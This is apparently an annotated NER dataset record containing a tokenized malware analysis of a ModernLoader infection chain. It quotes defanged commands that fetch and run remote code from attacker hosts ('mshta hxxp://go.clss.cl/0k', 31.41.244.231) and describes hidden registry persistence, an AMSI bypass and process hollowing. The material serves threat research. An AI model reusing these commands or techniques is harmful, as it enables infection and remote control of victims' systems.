{"doc_key": "013", "sentences": [["Initial", "finding", ":", "A", "command", "executed", "on", "the", "system", "."], ["The", "31.41.244.231", "IP", "is", "a", "Russian", "IP", "and", "hosts", "several", "other", "URLs", "with", "similar", "naming", "conventions", "."], ["The", "first", "command", "connects", "to", "the", "download", "server", "and", "downloads", "an", "HTA", "application", "whose", "script", "is", "obfuscated", "with", "HTML", "Guardian", ",", "an", "application", "that", "encrypts", "HTML", "code", "."], ["The", "content", "displayed", "when", "the", "HTA", "file", "is", "opened", "in", "a", "browser", "."], ["When", "deobfuscated", ",", "the", "HTA", "file", "executes", "the", "VB", "script", "code", "to", "download", "and", "run", "PowerShell", "code", "from", "hxxp", ":", "//31.41.244.231/0x", "?", "0=Loader", ",", "which", "launches", "the", "next", "stage", "of", "the", "loading", "process", "."], ["Deobfuscated", "HTA", "code", "."], ["The", "autorunnn.exe", "module", "(", "d9c8e82c42e489ac7a484cb98fed40980d63952be9a88ff9538fc23f7d4eb27f", ")", "is", "a", "modified", "variant", "of", "the", "SharpHide", "open-source", "utility", ",", "which", "attempts", "to", "create", "a", "hidden", "registry", "entry", "."], ["It", "uses", "NtSetValueKey", "native", "API", "to", "create", "a", "hidden", "(", "null-terminated", ")", "registry", "key", "by", "adding", "a", "null", "byte", "in", "front", "of", "the", "UNICODE_STRING", "key", "valuename", "."], ["\\HKLM|HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\shell", "set", "to", "run", "the", "command", ":", "``", "explorer.exe", ",", "cmd", "/c", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["The", "program", "also", "attempts", "to", "create", "a", "scheduled", "task", "which", "runs", "when", "the", "user", "logs", "onto", "the", "system", "."], ["The", "task", "name", "is", "``", "OneDrive", "Standalone", "Update", "Task", "''", "and", "it", "will", "attempt", "to", "execute", "the", "sams", "command", "to", "download", "and", "run", "the", "PowerShell", "loader", ":", "``", "mshta", "hxxp", ":", "//go.clss.cl/0k", "#", "=GoogleWindowsAnalyticsConfiguration", "''", "."], ["Modified", "SharpHide", "code", "is", "used", "to", "hide", "registry", "startup", "entry", "."], ["The", "URL", "serves", "PowerShell", "code", "which", "will", "be", "executed", "on", "the", "system", "."], ["As", "part", "of", "the", "logon", "sequence", ",", "the", "system", "executes", "a", "file", ",", "which", "ensures", "that", "the", "registry", "entry", "and", "the", "scheduled", "task", "set", "to", "download", "the", "next", "stage", "are", "set", "."], ["The", "next", "stage", "is", "the", "PowerShell", "loader", "."], ["The", "loader", "contains", "embedded", "code", "of", "three", "modules", ",", "which", "are", "loaded", "using", "reflection", "as", "additional", ".NET", "assemblies", "into", "the", "PowerShell", "process", "space", "."], ["The", "downloaded", "PowerShell", "code", "also", "downloads", "and", "runs", "auxiliary", "modules", "and", "payloads", "."], ["The", "first", "disables", "AMSI", "scanning", "functionality", ",", "the", "second", "is", "the", "final", "payload", ",", "and", "the", "last", "injects", "the", "payload", "into", "the", "process", "space", "of", "a", "newly", "created", "process", ",", "usually", "RegSvcs.exe", "."], ["Killamsi.dll", "is", "stored", "as", "a", "base64-encoded", "string", "split", "between", "the", "first", "two", "encoded", "characters", "and", "the", "rest", "of", "the", "encoded", "assembly", "DLL", "."], ["The", "DLL", "contains", "obfuscated", "code", ",", "which", "attempts", "to", "patch", "Microsoft", "'s", "AMSI", "interface", "(", "amsi.dll", ")", "AmsiScanBuffer", "function", "with", "the", "code", "to", "return", "an", "error", "value", "."], ["Amsi.dll", "is", "decoded", ",", "loaded", "and", "its", "Main", "function", "called", "."], ["The", "last", "module", "in", "the", "loader", "file", "is", "``", "friday.dll", "''", "."], ["It", "is", "obfuscated", "with", "multiple", "layers", "of", "obfuscation", ",", "such", "as", "ConfuserEx", "and", "Dotnet", "reactor", "."], ["It", "creates", "a", "new", "process", "and", "places", "the", "next", "injector", "stage", "into", "the", "newly", "created", "RegSvcs.exe", "process", "."], ["Friday.dll", "module", "is", "used", "to", "inject", "the", "next", "injection", "stage", "into", "RegSvcs.exe", "process", "."], ["The", "second-stage", "injector", "is", "an", "assembly", ":", "Managament.inf", "."], ["It", "creates", "an", "instance", "of", "svchost.exe", "process", "and", "injects", "code", "using", "process-hollowing", "to", "load", "the", "final", "payload", "stored", "in", "the", "initial", "PowerShell", "loader", "script", "."], ["The", "injector", "creates", "a", "svchost.exe", "process", "in", "suspended", "mode", "and", "then", "allocates", "virtual", "memory", "for", "the", "injection", "of", "the", "payload", "module", "."], ["The", "original", "svchost", "module", "is", "unmapped", "by", "calling", "the", "ZwUnmapViewOfSection", "."], ["This", "is", "followed", "by", "the", "fairly", "common", "injection", "sequence", "of", "API", "calls", "to", "get", "thread", "context", ",", "copy", "the", "data", "from", "the", "payload", "to", "the", "allocated", "virtual", "memory", ",", "set", "the", "thread", "context", "to", "point", "to", "the", "payload", "entry", "point", "and", ",", "finally", ",", "to", "resume", "the", "suspended", "thread", "."], ["Depending", "on", "the", "bitness", "of", "the", "operating", "system", ",", "the", "appropriate", "functions", "are", "used", "for", "getting", "and", "setting", "the", "thread", "contexts", "of", "the", "32", "bit", "process", "from", "the", "64", "bit", "operating", "system", "."], ["The", "injected", "payload", "is", "Client.exe", "(", "3f5856a9ec23f6daf20fe9e42e56da1b8dcb0de66b6628a92b554d6e17c02fc3", ")", ",", "a", "ModernLoader", "instance", "."], ["The", "payload", "for", "the", "initial", "loader", "URL", "is", "a", "simple", ".NET", "remote", "access", "trojan", ",", "ModernLoader", "."], ["ModernLoader", "'", "s", "constructor", "initializes", "the", "bot", "with", "a", "hardcoded", "C2", "URL", "."], ["Once", "the", "bot", "is", "initialized", ",", "it", "collects", "the", "following", "information", "about", "the", "system", "and", "send", "the", "information", "to", "the", "C2", "server", "using", "the", "HTTP", "Post", "request", "to", "hxxp", ":", "//31.41.244.231/AVAVA/gate.php", ":"], ["Win32_ComputerSystemProduct", "UUID", "(", "using", "WMI", "to", "query", "the", "configuration", "data", ")", "."], ["The", "external", "IP", "address", "by", "reading", "the", "response", "from", "http", ":", "//ipinfo.io/ip", "."], ["The", "IP", "address", "country", "by", "reading", "the", "response", "from", "http", ":", "//ipinfo.io/country", "."], ["The", "user", "privileges", "(", "admin", "or", "user", ")", "."], ["Once", "the", "initial", "data", "is", "sent", ",", "ModerLoader", "reads", "the", "response", "to", "find", "tasks", "returned", "from", "the", "servers", "using", "the", "JSON", "format", "."], ["ModernLoader", "executes", "tasks", "using", "the", "function", "DoTask", "."], ["DoTask", "accepts", "very", "few", "commands", "and", "can", "either", "execute", "a", "command", "line", "or", "download", "and", "execute", "a", "file", "."], ["ModernLoader", "runs", "in", "an", "endless", "loop", "periodically", "contacting", "the", "C2", "server", "for", "new", "tasks", "until", "the", "process", "is", "terminated", "."], ["Its", "main", "purpose", "is", "to", "download", "and", "execute", "additional", "payloads", "and", "modules", ",", "as", "instructed", "by", "the", "C2", "server", "."]], "ner": [[], [[11, 11, "SO"]], [[28, 29, "MP"], [33, 34, "SO"], [38, 39, "MF"]], [[60, 60, "MP"], [66, 66, "TP"]], [[72, 72, "MP"], [76, 77, "MF"], [83, 84, "MP"], [86, 90, "SO"], [99, 100, "MP"]], [], [[107, 107, "MP"], [128, 129, "SF"]], [[131, 131, "MP"]], [[166, 166, "MP"], [171, 175, "SO"]], [], [[208, 208, "MP"], [221, 222, "MF"], [226, 230, "SO"]], [], [[247, 247, "MP"]], [[274, 275, "SF"]], [[294, 295, "MP"]], [[298, 298, "MP"], [317, 318, "MP"]], [[323, 324, "MP"], [329, 329, "MF"], [332, 332, "MF"]], [[346, 346, "MP"], [353, 353, "MP"], [365, 365, "TP"]], [[367, 367, "MP"]], [[391, 391, "MP"], [405, 405, "SF"]], [[418, 418, "SF"]], [[438, 438, "MF"]], [], [[457, 457, "MP"], [461, 461, "MP"], [472, 472, "TP"]], [[475, 475, "MF"], [486, 486, "TP"]], [], [[498, 498, "MP"], [503, 503, "MP"]], [[527, 527, "MP"]], [], [], [], [[643, 643, "MP"], [649, 649, "MP"]], [[667, 667, "MP"]], [], [[688, 688, "MP"], [692, 695, "SF"], [698, 699, "TF"], [710, 712, "SO"]], [], [], [], [], [[768, 768, "MP"], [777, 778, "SO"], [781, 781, "MF"]], [[784, 784, "MP"], [790, 790, "MP"]], [[792, 792, "MP"]], [[811, 811, "MP"]], []], "relations": [[], [[11, 11, 33, 34, "CO"]], [[28, 29, 33, 34, "RF"], [28, 29, 38, 39, "WR"], [28, 29, 66, 66, "FR"]], [[66, 66, 60, 60, "FR"], [60, 60, 72, 72, "CO"]], [[72, 72, 76, 77, "EX"], [72, 72, 83, 84, "FR"], [72, 72, 86, 90, "RF"], [83, 84, 99, 100, "FR"], [99, 100, 128, 129, "RD"], [99, 100, 107, 107, "CO"], [99, 100, 131, 131, "CO"]], [], [[107, 107, 128, 129, "WR"]], [[131, 131, 166, 166, "FR"]], [[166, 166, 171, 175, "ST"], [166, 166, 171, 175, "RF"], [166, 166, 208, 208, "CO"], [171, 175, 226, 230, "CO"]], [], [[208, 208, 221, 222, "WR"], [208, 208, 226, 230, "RF"], [208, 208, 247, 247, "FR"]], [], [[247, 247, 221, 222, "EX"], [247, 247, 274, 275, "RD"], [247, 247, 274, 275, "RD"], [247, 247, 274, 275, "WR"], [247, 247, 294, 295, "CO"], [247, 247, 298, 298, "CO"], [247, 247, 323, 324, "CO"]], [], [], [[317, 318, 274, 275, "RD"], [317, 318, 274, 275, "RD"], [317, 318, 274, 275, "WR"], [317, 318, 274, 275, "RD"], [317, 318, 274, 275, "RD"], [317, 318, 274, 275, "WR"], [317, 318, 365, 365, "FR"]], [[323, 324, 329, 329, "WR"], [323, 324, 332, 332, "WR"], [323, 324, 346, 346, "FR"], [323, 324, 367, 367, "FR"]], [[346, 346, 332, 332, "EX"], [353, 353, 346, 346, "CO"]], [[367, 367, 405, 405, "RD"], [367, 367, 329, 329, "EX"], [367, 367, 418, 418, "RD"], [367, 367, 418, 418, "RD"], [367, 367, 418, 418, "WR"], [367, 367, 391, 391, "CO"]], [[391, 391, 405, 405, "WR"]], [], [[438, 438, 418, 418, "RD"], [438, 438, 418, 418, "WR"]], [], [[457, 457, 461, 461, "FR"], [461, 461, 438, 438, "EX"], [461, 461, 472, 472, "IJ"], [472, 472, 475, 475, "RD"], [472, 472, 475, 475, "WR"], [472, 472, 475, 475, "EX"], [461, 461, 503, 503, "CO"], [461, 461, 527, 527, "CO"]], [[486, 486, 475, 475, "WR"], [486, 486, 475, 475, "WR"], [486, 486, 498, 498, "FR"]], [], [[498, 498, 692, 695, "RD"], [498, 498, 692, 695, "RD"], [498, 498, 692, 695, "WR"]], [[527, 527, 643, 643, "FR"]], [], [], [], [[643, 643, 649, 649, "CO"], [643, 643, 667, 667, "CO"], [643, 643, 688, 688, "CO"], [643, 643, 768, 768, "CO"], [643, 643, 784, 784, "CO"]], [], [], [[688, 688, 692, 695, "RD"], [688, 688, 698, 699, "WR"], [688, 688, 710, 712, "ST"]], [], [], [], [], [[768, 768, 777, 778, "RF"], [768, 768, 781, 781, "RD"]], [], [], [], []]}